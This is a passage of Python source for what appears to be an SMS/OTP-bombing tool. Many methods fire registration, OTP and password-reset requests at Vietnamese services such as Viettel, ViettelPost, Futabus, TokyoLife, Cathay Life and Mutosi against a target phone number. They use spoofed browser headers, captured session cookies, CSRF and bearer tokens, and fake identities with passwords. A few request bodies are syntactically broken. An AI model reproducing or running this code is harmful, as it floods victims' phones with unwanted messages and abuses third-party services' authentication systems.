                    'X-XSRF-TOKEN': 'eyJpdiI6InhFOEozSXJqVEJxMEFURDEwMkd4c0E9PSIsInZhbHVlIjoiU0hFS0htQTJXMWg5cnJMWjdDRHUwS01RS3BOaVRIYmU5VzgySFJlNVp4TUhoazI1cDFDSS93TGZ4TjFQZ00wbHBFclVOejlTQmhvdW5CME9xSFNQV0x5KzNZc1Q4dlZkM0xUZUJicllwRkZQQUNUb0s0eVBmYlRmK280TkZsY3kiLCJtYWMiOiI1OGJlZDg1ZjJlNTQ1Y2Q0YTA2OTVhODJmYTQ0MDBmZWY3ZDY0MTcwMjFiOTg2MDJjYTc4MGFjNDY4ZWFlYzc5IiwidGFnIjoiIn0=',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            json={
                    'mobile': sdt,
                    'mobile_country_prefix': '84',
                },
            data={
                    'mobile': sdt,
                    'mobile_country_prefix': '84',
                },
            api_name="CALL_MEDICARE"
        )

    def send_call_futabus(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api.vato.vn/api/authenticate/request_code",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://futabus.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://futabus.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjBjYjQyNzQyYWU1OGY0ZGE0NjdiY2RhZWE0Yjk1YTI5ZmJhMGM1ZjkiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMjQyNDU2MywidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIyNDI0NTYzLCJleHAiOjE3MjI0MjgxNjMsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.nP7jES3RVs4QgGnUoJKXml9KS7ZjOwuMlSaRklAjA7Kp8bKGmJRJFCLb1bX_am-nXovNAQ9mZ_68k7BII6SEahctrppOqeubMO-rtOfS8zOGd0_9_fWi9DBIEjEjuNJYhd55USesLwVtb5zd3fg5qjbC-QZAKo4J-V61HQvQEIBEe2EDSqDKGdtsZZ7ph33Kl5vGcpINGH-yt-2gkFAmyaoft6PpjjcS7wC_RpRkGi_bwUxG6JNXQUyBZq82T84JuqdolplXABMxd1gSBLNeBazriCAGYLsRexuvFHoet7VvEnlSm3Gnlf1oTIuR0nm1qRPsOA5W-RbZzu45fSv5jQ',
                    'x-app-id': 'client',
                },
            json={
                    'phoneNumber': sdt,
                    'deviceId': 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
                    'use_for': 'LOGIN',
                },
            data={
                    'phoneNumber': sdt,
                    'deviceId': 'd46a74f1-09b9-4db6-b022-aaa9d87e11ed',
                    'use_for': 'LOGIN',
                },
            api_name="CALL_FUTABUS"
        )

    def send_call_ViettelPost(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://id.viettelpost.vn/Account/SendOTPByPhone",
            method="POST",
            headers={
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Cache-Control': 'max-age=0',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'DNT': '1',
                    'Origin': 'null',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            data={
                    'FormRegister.FullName': 'Nguyễn Quang Ngọc',
                    'FormRegister.Phone': sdt,
                    'FormRegister.Password': 'BEAUTYBOX12a@',
                    'FormRegister.ConfirmPassword': 'BEAUTYBOX12a@',
                    'ReturnUrl': '/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=3r25st1hpummjj42ig7zmt',
                    'ConfirmOtpType': 'Register',
                    'FormRegister.IsRegisterFromPhone': 'true',
                    '__RequestVerificationToken': 'CfDJ8ASZJlA33dJMoWx8wnezdv8kQF_TsFhcp3PSmVMgL4cFBdDdGs-g35Tm7OsyC3m_0Z1euQaHjJ12RKwIZ9W6nZ9ByBew4Qn49WIN8i8UecSrnHXhWprzW9hpRmOi4k_f5WQbgXyA9h0bgipkYiJjfoc',
                },
            api_name="CALL_VIETTELPOST"
        )

    def send_call_myviettel2(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://viettel.vn/api/get-otp-contract-mobile",
            method="POST",
            headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json;charset=UTF-8',
                    'DNT': '1',
                    'Origin': 'https://viettel.vn',
                    'Referer': 'https://viettel.vn/myviettel',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'X-CSRF-TOKEN': 'PCRPIvstcYaGt1K9tSEwTQWaTADrAS8vADc3KGN7',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-XSRF-TOKEN': 'eyJpdiI6IlRrek5qTnc0cjBqM2VYeTRrVUhkZlE9PSIsInZhbHVlIjoiWmNxeVBNZ09nSHQ1MUcwN2JoaWY0TFZKU0RzbVRVNHdkSnlPZlJCTnQ2akhkNjIxZ21pWG9tZnVyNDZzZmlvTyIsIm1hYyI6IjJlZmZhZGI4ZTRjZjQ5NDIyYWFjNTY1ZjYzMzI2OTYzZTE5OTc2ZDBjZmU1MTgyMmFmMjYwNWZkM2UwNzYwMDAifQ==',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            json={
                    'msisdn': sdt,
                    'type': 'register',
                },
            data={
                    'msisdn': sdt,
                    'type': 'register',
                },
            api_name="CALL_MYVIETTEL2"
        )

    def send_call_myviettel3(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://viettel.vn/api/get-otp",
            method="POST",
            headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json;charset=UTF-8',
                    'Origin': 'https://viettel.vn',
                    'Referer': 'https://viettel.vn/dang-ky',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
                    'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
                    'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            cookies={
                    'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
                    '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
                    'redirectLogin': 'https://viettel.vn/dang-ky',
                    'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
                },
            json={
                    'msisdn': sdt,
                },
            data={
                    'msisdn': sdt,
                },
            api_name="CALL_MYVIETTEL3"
        )

    def send_call_TOKYOLIFE(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register",
            method="POST",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://tokyolife.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://tokyolife.vn/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'signature': 'c5b0d82fae6baaced6c7f383498dfeb5',
                    'timestamp': '1722427632213',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'phone_number': sdt,
                    'name': 'Nguyễn Quang Ngọc',
                    'password': 'pUL3.GFSd4MWYXp',
                    'email': 'reggg10tb@gmail.com',
                    'birthday': '2002-03-12',
                    'gender': 'male',
                },
            data={
                    'phone_number': sdt,
                    'name': 'Nguyễn Quang Ngọc',
                    'password': 'pUL3.GFSd4MWYXp',
                    'email': 'reggg10tb@gmail.com',
                    'birthday': '2002-03-12',
                    'gender': 'male',
                },
            api_name="CALL_TOKYOLIFE"
        )

    def send_call_30shine(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send",
            method="POST",
            headers={
                    'accept': 'application/json',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'authorization': '',
                    'content-type': 'application/json',
                    'dnt': '1',
                    'origin': 'https://30shine.com',
                    'priority': 'u=1, i',
                    'referer': 'https://30shine.com/',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            json={
                    'phone': sdt,
                },
            data={
                    'phone': sdt,
                },
            api_name="CALL_30SHINE"
        )

    def send_call_Cathaylife(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP",
            method="POST",
            headers={
                    'Accept': 'application/json, text/javascript, */*; q=0.01',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'DNT': '1',
                    'Origin': 'https://www.cathaylife.com.vn',
                    'Referer': 'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'X-Requested-With': 'XMLHttpRequest',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            cookies={
                    'JSESSIONID': 'ZjlRw5Octkf1Q0h4y7wuolSd.06283f0e-f7d1-36ef-bc27-6779aba32e74',
                    'TS01f67c5d': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
                    'BIGipServerB2C_http': '!eqlQjZedFDGilB8R4wuMnLjIghcvhm00hRkv5r0PWCUgWACpgl2dQhq/RKFBz4cW5enIUjkvtPRi3g==',
                    'TS0173f952': '0110512fd73245ad6bf8bdc8c6ac8902ce3e960a6c7eb07d18dd1e1c3fe6e278974acc677dadaad48d0aa2def9c473df39d47f1c67',
                    'TSPD_101': '085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d:085958f7b7ab2800d34d959c369ea6a7fce5cd0dbad28a1e7cd7c50db15147605c1b678e16d4675b5784f7fab853136d0871bbef8b06300099f17383b7da12e0c76ce4da29c084a949802fbe8ac2e34063489a3702fb270ef592a854c40a20cd53f9829e711e0af0',
                    'INITSESSIONID': 'e0266dc6478152a4358bd3d4ae77bde0',
                },
            data={
                    'memberMap': f'{{"userName":"rancellramseyis792@gmail.com","password":"traveLo@a123","birthday":"03/07/2001","certificateNumber":"034202008372","phone":"{sdt},
            api_name="CALL_CATHAYLIFE"
        )

    def send_call_vinamilk(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://new.vinamilk.com.vn/api/account/getotp",
            method="POST",
            headers={
                    'accept': '*/*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'authorization': 'Bearer null',
                    'content-type': 'text/plain;charset=UTF-8',
                    'dnt': '1',
                    'origin': 'https://new.vinamilk.com.vn',
                    'priority': 'u=1, i',
                    'referer': 'https://new.vinamilk.com.vn/account/register',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            data=f'{{",
            api_name="CALL_VINAMILK"
        )

    def send_call_vietloan2(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://vietloan.vn/register/phone-resend",
            method="POST",
            headers={
                'accept': '*/*',
                'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://vietloan.vn',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://vietloan.vn/register',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                },
            cookies={
                '_fbp': 'fb.1.1720102725444.358598086701375218',
                '_gcl_au': '1.1.619229570.1720102726',
                'mousestats_vi': 'acaa606972ae539932c0',
                '_tt_enable_cookie': '1',
                '_ttp': 'tGf0fClVBAWb7n4wsYwyYbdPx5W',
                '_ym_uid': '1720102728534641572',
                '_ym_d': '1720102728',
                '_gid': 'GA1.2.557208002.1720622172',
                '_clck': '14x7a16%7C2%7Cfnc%7C0%7C1646',
                '_ym_isad': '2',
                '__cfruid': '92805d7d62cc6333c3436c959ecc099040706b4f-1720628273',
                '_ym_visorc': 'w',
                'XSRF-TOKEN': 'eyJpdiI6IjJUcUxmYUFZY3ZGR3hFVFFGS2QybkE9PSIsInZhbHVlIjoidWVYSDZTZmVKOWZ0MFVrQnJ0VHFMOUZEdkcvUXZtQzBsTUhPRXg2Z0FWejV0U3grbzVHUUl6TG13Z09PWjhMQURWN0pkRFl4bzI3Nm9nQTdFUm5HTjN2TFd2NkExTlQ5RjUwZ1hGZEpDaUFDUTkxRVpwRzdTdWhoVElNRVYvbzgiLCJtYWMiOiI0ZTU0MWY5ZDI2NGI3MmU3ZGQwMDIzMjNiYjJjZDUyZjIzNjdkZjc0ODFhNWVkMTdhZWQ0NTJiNDgxY2ZkMDczIiwidGFnIjoiIn0%3D',
                'sessionid': 'eyJpdiI6InBWUDRIMVE1bUNtTk5CN0htRk4yQVE9PSIsInZhbHVlIjoiMGJwSU1VOER4ZnNlSCt1L0Vjckp0akliMWZYd1lXaU01K08ybXRYOWtpb2theFdzSzBENnVzWUdmczFQNzN1YU53Uk1hUk1lZWVYM25sQ0ZwbytEQldGcCthdUR4S29sVHI3SVRKcEZHRndobTlKcWx2QVlCejJPclc1dkU1bmciLCJtYWMiOiJiOTliN2NkNmY5ZDFkNTZlN2VhODg3NWIxMmEzZmVlNzRmZjU1ZGFmZWYxMzI0ZWYwNDNmMWZmMDljNmMzZDdhIiwidGFnIjoiIn0%3D',
                'utm_uid': 'eyJpdiI6IlFPQ2UydEhQbC8zbms5ZER4M2t5WWc9PSIsInZhbHVlIjoiaWlBdVppVG9QRjhEeVJDRmhYUGUvRWpMMzNpZHhTY1czTWptMDYvK2VERVFhYzFEaDV1clJBczZ2VzlOSW1YR3dVMDRRUHNYQkMvYWRndS9Kekl5KzhlNU1Xblk5NHVjdmZEcjRKNVE5RXI3cnp0MzJSd3hOVVYyTHNMMDZuT0UiLCJtYWMiOiIyOGVmNGM1NmIyZmZlNTMzZmI5OWIxYzI2NjI3Yzg2Yjg0YTAwODMxMjlkMDE0ZTU3MjVmZTViMjc5MDM1YTE4IiwidGFnIjoiIn0%3D',
                '_ga': 'GA1.2.1882430469.1720102726',
                'ec_png_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
                'ec_png_client': 'false',
                'ec_png_client_utm': 'null',
                'ec_cache_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
                'ec_cache_client': 'false',
                'ec_cache_client_utm': 'null',
                'ec_etag_client': 'false',
                'ec_etag_utm': '12044e63-ea79-83c1-269a-86ba3fc88165',
                'ec_etag_client_utm': 'null',
                '_clsk': '1kt5hyl%7C1720628299918%7C2%7C1%7Cx.clarity.ms%2Fcollect',
                '_ga_EBK41LH7H5': 'GS1.1.1720622171.4.1.1720628300.41.0.0',
                'uid': '12044e63-ea79-83c1-269a-86ba3fc88165',
                'client': 'false',
                'client_utm': 'null',
                },
            data={
                'phone': sdt,
                '_token': '0fgGIpezZElNb6On3gIr9jwFGxdY64YGrF8bAeNU',
                },
            api_name="CALL_VIETLOAN2"
        )

    def send_call_batdongsan(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister",
            method="GET",
            headers={
                    'accept': 'application/json, text/plain, */*',
                    'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
                    'dnt': '1',
                    'priority': 'u=1, i',
                    'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                },
            params={
                    'phoneNumber': sdt,
                },
            api_name="CALL_BATDONGSAN"
        )

    def send_call_GUMAC(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://cms.gumac.vn/api/v1/customers/verify-phone-number",
            method="POST",
            headers={
                    'Accept': 'application/json',
                    'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    'DNT': '1',
                    'Origin': 'https://gumac.vn',
                    'Referer': 'https://gumac.vn/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
                    'sec-ch-ua': '"Not)A;Brand";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            json={
                    'phone': sdt,
                },
            data={
                    'phone': sdt,
                },
            api_name="CALL_GUMAC"
        )

    def send_call_mutosi(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api-omni.mutosi.com/client/auth/register",
            method="POST",
            headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    'Origin': 'https://mutosi.com',
                    'Pragma': 'no-cache',
                    'Referer': 'https://mutosi.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            json={
                    'name': 'hà khải',
                    'phone': sdt,
                    'password': 'Vjyy1234@',
                    'confirm_password': 'Vjyy1234@',
                    'firstname': None,
                    'lastname': None,
                    'verify_otp': 0,
                    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
                    'email': 'dđ@gmail.com',
                    'birthday': '2006-02-13',
                    'accept_the_terms': 1,
                    'receive_promotion': 1,
                },
            data={
                    'name': 'hà khải',
                    'phone': sdt,
                    'password': 'Vjyy1234@',
                    'confirm_password': 'Vjyy1234@',
                    'firstname': None,
                    'lastname': None,
                    'verify_otp': 0,
                    'store_token': '226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
                    'email': 'dđ@gmail.com',
                    'birthday': '2006-02-13',
                    'accept_the_terms': 1,
                    'receive_promotion': 1,
                },
            api_name="CALL_MUTOSI"
        )

    def send_call_mutosi1(self, session, sdt: str) -> bool:
        return self.send_request(
            session, "https://api-omni.mutosi.com/client/auth/reset-password/send-phone",
            method="POST",
            headers={
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
                    'Authorization': 'Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b',
                    'Cache-Control': 'no-cache',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/json',
                    'Origin': 'https://mutosi.com',
                    'Pragma': 'no-cache',
                    'Referer': 'https://mutosi.com/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-site',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                },
            json={
                    'phone': sdt,
                    'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
                    'source': 'web_consumers',
                },
            data={
                    'phone': sdt,
                    'token': '03AFcWeA4O6j16gs8gKD9Zvb-gkvoC-kBTVH1xtMZrMmjfODRDkXlTkAzqS6z0cT_96PI4W-sLoELf2xrLnCpN0YvCs3q90pa8Hq52u2dIqknP5o7ZY-5isVxiouDyBbtPsQEzaVdXm0KXmAYPn0K-wy1rKYSAQWm96AVyKwsoAlFoWpgFeTHt_-J8cGBmpWcVcmOPg-D4-EirZ5J1cAGs6UtmKW9PkVZRHHwqX-tIv59digmt-KuxGcytzrCiuGqv6Rk8H52tiVzyNTtQRg6JmLpxe7VCfXEqJarPiR15tcxoo1RamCtFMkwesLd39wHBDHxoyiUah0P4NLbqHU1KYISeKbGiuZKB2baetxWItDkfZ5RCWIt5vcXXeF0TF7EkTQt635L7r1wc4O4p1I-vwapHFcBoWSStMOdjQPIokkGGo9EE-APAfAtWQjZXc4H7W3Aaj0mTLpRpZBV0TE9BssughbVXkj5JtekaSOrjrqnU0tKeNOnGv25iCg11IplsxBSr846YvJxIJqhTvoY6qbpFZymJgFe53vwtJhRktA3jGEkCFRdpFmtw6IMbfgaFxGsrMb2wkl6armSvVyxx9YKRYkwNCezXzRghV8ZtLHzKwbFgA6ESFRoIHwDIRuup4Da2Bxq4f2351XamwzEQnha6ekDE2GJbTw',
                    'source': 'web_consumers',
                },
            api_name="CALL_MUTOSI1"
        )

    def send_call_vietair(self, session, sdt: str) -> bool:
        return self.send_request(
